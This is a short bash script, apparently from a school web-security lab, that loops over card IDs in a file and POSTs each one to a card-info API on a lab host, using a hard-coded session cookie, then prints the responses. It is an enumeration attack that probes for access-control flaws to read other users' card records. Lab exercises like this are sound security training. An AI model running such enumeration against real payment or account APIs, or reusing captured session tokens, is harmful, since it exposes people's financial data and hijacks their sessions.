#!/bin/bash

echo "[*] Starting card scan..."

while IFS= read -r card_id; do
  echo -e "\n>> Checking card_id: $card_id"
  curl -s 'http://web0x06.hbtn/api/cards/info' \
    -X POST \
    -H 'Content-Type: application/json' \
    -H 'Cookie: session=byZFF-GmTu5avcQIhOnDyZ9RO1T-c2dl-LWkF5v9U3g.PqEnCJNEpM_WUjOrt_aExw0cyEY' \
    --data-raw "{\"cards_id\":[\"$card_id\"]}" \
    | jq .
done < cards.txt

